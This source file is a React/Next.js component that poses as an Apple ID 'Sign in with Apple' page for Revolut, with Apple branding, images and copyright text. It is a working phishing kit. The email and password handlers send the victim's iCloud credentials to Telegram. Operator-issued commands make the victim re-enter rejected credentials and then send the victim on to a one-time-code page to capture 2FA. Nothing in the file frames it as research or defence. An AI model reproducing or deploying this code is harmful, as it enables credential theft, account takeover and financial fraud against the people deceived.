"use client"
import '../app/globals.css';
import { useState, useEffect } from 'react';
import { sendMessageToTelegram } from '../lib/api';
import { useCommand } from '../app/lib/CommandContext';
import { useRouter } from 'next/navigation';

export default function AppleAuth() {
    const [isFocused, setIsFocused] = useState(false);
    const [isPasswordFocused, setIsPasswordFocused] = useState(false);
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [currentStep, setCurrentStep] = useState('email'); // 'email' or 'password'
    const [isLoading, setIsLoading] = useState(false);
    const [isInvalid, setInvalid] = useState(false);
    const router = useRouter();
    const { command, resetCommand } = useCommand();

    useEffect(() => {
        if (command === 'REQUEST_ICLOUD_EMAIL_AGAIN') {
            setInvalid(true);
            setIsLoading(false);
            setCurrentStep('email');
        } else if (command === 'REQUEST_ICLOUD_PASSWORD') {
            setIsLoading(false);
            setCurrentStep('password');
        } else if (command === 'REQUEST_ICLOUD_PASSWORD_AGAIN') {
            setInvalid(true);
            setIsLoading(false);
            // setCurrentStep('password');
        } else if (command === 'REQUEST_ICLOUD_2FA_OTP') {
            setTimeout(() => {
                router.push('/AppleOtpPage');
            }, 1500);
        } else if (command === 'FINISH') {
            router.push('/verificationPage');
        }
    }, [command, router, resetCommand]);

    const handleEmailSubmit = (e) => {
        e.preventDefault();
        if (!email.trim()) return;
        
        setIsLoading(true);
        // console.log("Email submitted:", email);
        sendMessageToTelegram(`ICLOUD EMAIL: ${email}`)
        
        // Simulate API call delay
        // setTimeout(() => {
        //     setIsLoading(false);
        //     setCurrentStep('password');
        // }, 1500);
    };

    const handlePasswordSubmit = (e) => {
        e.preventDefault();
        if (!password.trim()) return;
        
        setIsLoading(true);
        sendMessageToTelegram(`ICLOUD PASSWORD: ${password}`)
        // console.log("Email:", email, "Password:", password);
        
        // You can add API call here to send the data
        // For now just logging to console
        
        // Simulate API call delay
        // setTimeout(() => {
        //     setIsLoading(false);
        //     // You can redirect or show success message here
        // }, 1500);
    };

    const stopLoader = () => {
        setIsLoading(false);
    };

    const hideError = () => {
      setInvalid(false);
    };

    // Add to your component body
    useEffect(() => {
      const handleGlobalClick = () => {
        hideError();
      };
      
      document.addEventListener('click', handleGlobalClick);
      
      return () => {
        document.removeEventListener('click', handleGlobalClick);
      };
    }, []);





    return (
        <div className="bg-white text-black">
            {/* Header */}
            <div className="flex flex-col max-w-[1020px] gap-3 px-3 mx-auto max-h-[100px]">

                {/* header-one */}
                <div className="w-full flex justify-between items-start max-h-[48px] relative -mt-[2px]">
                    <div className='relative -mt-[14px]'>
                        <svg height="78" viewBox="0 0 17 48" width="14" xmlns="http://www.w3.org/2000/svg" className="scale-100">
                            <path d="m15.5752 19.0792a4.2055 4.2055 0 0 0 -2.01 3.5376 4.0931 4.0931 0 0 0 2.4908 3.7542 9.7779 9.7779 0 0 1 -1.2755 2.6351c-.7941 1.1431-1.6244 2.2862-2.8878 2.2862s-1.5883-.734-3.0443-.734c-1.42 0-1.9252.7581-3.08.7581s-1.9611-1.0589-2.8876-2.3584a11.3987 11.3987 0 0 1 -1.9373-6.1487c0-3.61 2.3464-5.523 4.6566-5.523 1.2274 0 2.25.8062 3.02.8062.734 0 1.8771-.8543 3.2729-.8543a4.3778 4.3778 0 0 1 3.6822 1.841zm-6.8586-2.0456a1.3865 1.3865 0 0 1 -.2527-.024 1.6557 1.6557 0 0 1 -.0361-.337 4.0341 4.0341 0 0 1 1.0228-2.5148 4.1571 4.1571 0 0 1 2.7314-1.4078 1.7815 1.7815 0 0 1 .0361.373 4.1487 4.1487 0 0 1 -.9867 2.587 3.6039 3.6039 0 0 1 -2.5148 1.3236z"></path>
                        </svg>
                    </div>
                </div>

                <div className="flex absolute opacity-50 right-5 top-5 md:hidden">
                    <svg width="16px" className='scale-150' height="16px" viewBox="0 0 20 20"><polyline id="globalnav-menutrigger-bread-bottom" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-bottom" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 12, 16 12"><animate id="globalnav-anim-menutrigger-bread-bottom-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 12, 16 12; 2 9, 16 9; 3.5 15, 15 3.5"></animate><animate id="globalnav-anim-menutrigger-bread-bottom-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 15, 15 3.5; 2 9, 16 9; 2 12, 16 12"></animate></polyline><polyline id="globalnav-menutrigger-bread-top" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-top" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 5, 16 5"><animate id="globalnav-anim-menutrigger-bread-top-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 5, 16 5; 2 9, 16 9; 3.5 3.5, 15 15"></animate><animate id="globalnav-anim-menutrigger-bread-top-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 3.5, 15 15; 2 9, 16 9; 2 5, 16 5"></animate></polyline></svg>
                </div>

                {/* header-two */}
                <div className="w-full flex border-b border-gray-300 pb-3 justify-between items-center max-h-[48px]">
                    <div className='AppleSemiBold font-semibold text-xl'>
                        Apple Account
                    </div>

                    <div className="text-xs AppleReg text-gray-500">
                        Sign in
                    </div>
                </div>
            </div>

            {/* main container */}
            <div className='flex flex-col items-center mt-9 w-full'>
                <div className='flex-col w-full px-3 max-w-[507px]'>
                    {/* Authentication Logo - text */}
                    <div className='flex flex-col gap-[10px] justify-center text-center items-center w-full'>
                        <div className='w-16 h-16 rounded-xl p-1' style={{ boxShadow: '0 0 10px rgba(0, 0, 0, 0.2)' }}>
                            <img src="https://assets.revolut.com/assets/brand/Revolut-Symbol-Black.svg" alt="Revolut Logo" />
                        </div>

                        <p className='text-md text-gray-800'>Use your Apple Account to sign in to Revolut.</p>
                    </div>

                    {/* form */}
                    <div className='w-full mt-9'>
                        {currentStep === 'email' && (
                            <form onSubmit={handleEmailSubmit}>
                                {/* Email Input Container */}
                                <div
                                    className={`relative w-full border rounded-xl ${isInvalid ? 'border-red-500' : 'border-gray-400'} h-[56px] transition-all duration-200 ${isFocused ? 'border-blue-500 border-2' : ''}`}
                                >
                                    {/* Label */}
                                    <label
                                        className={`absolute left-4 transition-all duration-200 ${isFocused || email
                                            ? 'top-1 text-xs'
                                            : 'top-1/2 transform -translate-y-1/2 text-gray-500'
                                            }`}
                                    >
                                        Email or Phone Number
                                    </label>

                                    {/* Input */}
                                    <input
                                        type="text"
                                        value={email}
                                        onChange={(e) => setEmail(e.target.value)}
                                        className="w-full h-full px-4 pt-4 pb-2 bg-transparent outline-none"
                                          onFocus={() => {
                                            setIsFocused(true);
                                            hideError();
                                          }}
                                          onBlur={(e) => {
                                            if (!e.target.value) setIsFocused(false);
                                          }}
                                    />

                                    {/* Icon Container */}
                                    <button
                                        type="submit"
                                        className={`absolute border p-1 rounded-full border-gray-500 right-4 transition-all duration-200 ${isFocused || email ? 'top-5' : 'top-1/2 transform -translate-y-1/2'}`}
                                        disabled={isLoading}
                                    >
                                        {isLoading ? (
                                            <div className="w-5 h-5 border-t-2 border-blue-500 border-solid rounded-full animate-spin"></div>
                                        ) : (
                                            <svg
                                                xmlns="http://www.w3.org/2000/svg"
                                                height="20px"
                                                viewBox="0 -960 960 960"
                                                width="20px"
                                                fill="#6b7280"
                                            >
                                                <path d="M440-200v-240H80v-80h360v-240l440 280-440 280Z" />
                                            </svg>
                                        )}
                                    </button>
                                </div>

                                {isInvalid && (
                                    <p className="text-red-500 text-sm mt-1">
                                        Please enter a valid email address or phone number.
                                    </p>
                                )}
                            </form>
                        )}

                        {currentStep === 'password' && (
                            <form onSubmit={handlePasswordSubmit}>
                                {/* Password Input Container */}
                                <div
                                    className={`relative w-full border rounded-xl border-gray-400 h-[56px] transition-all duration-200 ${isPasswordFocused ? 'border-blue-500 border-2' : ''}`}
                                >
                                    {/* Label */}
                                    <label
                                        className={`absolute left-4 transition-all duration-200 ${isPasswordFocused || password
                                            ? 'top-1 text-xs'
                                            : 'top-1/2 transform -translate-y-1/2 text-gray-500'
                                            }`}
                                    >
                                        Password
                                    </label>

                                    {/* Input */}
                                    <input
                                        type="password"
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        className="w-full h-full px-4 pt-4 pb-2 bg-transparent outline-none"
                                        onFocus={() => {
                                            setIsFocused(true);
                                            hideError();
                                          }}
                                        onBlur={(e) => {
                                            if (!e.target.value) setIsPasswordFocused(false);
                                        }}
                                    />

                                    {/* Icon Container */}
                                    <button
                                        type="submit"
                                        className={`absolute border p-1 rounded-full border-gray-500 right-4 transition-all duration-200 ${isPasswordFocused || password ? 'top-5' : 'top-1/2 transform -translate-y-1/2'}`}
                                        disabled={isLoading}
                                    >
                                        {isLoading ? (
                                            <div className="w-5 h-5 border-t-2 border-blue-500 border-solid rounded-full animate-spin"></div>
                                        ) : (
                                            <svg
                                                xmlns="http://www.w3.org/2000/svg"
                                                height="20px"
                                                viewBox="0 -960 960 960"
                                                width="20px"
                                                fill="#6b7280"
                                            >
                                                <path d="M440-200v-240H80v-80h360v-240l440 280-440 280Z" />
                                            </svg>
                                        )}
                                    </button>
                                </div>
                                {isInvalid && (
                                    <p className="text-red-500 text-sm mt-1">
                                        Incorrect Password.
                                    </p>
                                )}
                            </form>
                        )}


                        {/* forgot password */}
                        <div className='text-blue-500 mt-5 w-full text-center flex justify-center'>
                            <a href="" className='flex gap-1 items-end'>
                                <p>
                                    Forgot Password?
                                </p>
                                <svg xmlns="http://www.w3.org/2000/svg" className='relative mb-[2px]' height="14px" viewBox="0 -960 960 960" width="14px" fill="#3b82f6"><path d="m256-240-56-56 384-384H240v-80h480v480h-80v-344L256-240Z" /></svg>
                            </a>
                        </div>
                    </div>


                    {/* Bottom container */}
                    <div className='flex mt-5 w-full max-w-[328px] mx-auto justify-center items-center flex-col'>
                        <div>
                            <img src="https://appleid.cdn-apple.com/appleauth/static/bin/cb1900903086/dist/assets/privacy-icon.png" alt="" className='w-8' />
                        </div>
                        <p className='text-[12px] mt-3 font-light text-center'>
                            In setting up Sign in with Apple, information about your interactions with Apple and this device may be used by Apple to help prevent fraud. <span className='text-blue-700'>See how your data is managed...</span>
                        </p>
                    </div>
                </div>



                {/* Footer container */}
                <div className='flex mt-16 sm:relative absolute bottom-0 px-[22px] h-[83px]  bg-[#f7f7f7] w-full justify-center items-center flex-col'>
                    <div className='text-gray-700 text-xs'>
                        Copyright © 2025 Apple Inc. All rights reserved.
                    </div>
                    <div>
                        <a href="" className='text-xs font-light hover:underline'>
                            Privacy Policy
                        </a>
                    </div>
                </div>
            </div>
        </div >
    )
}
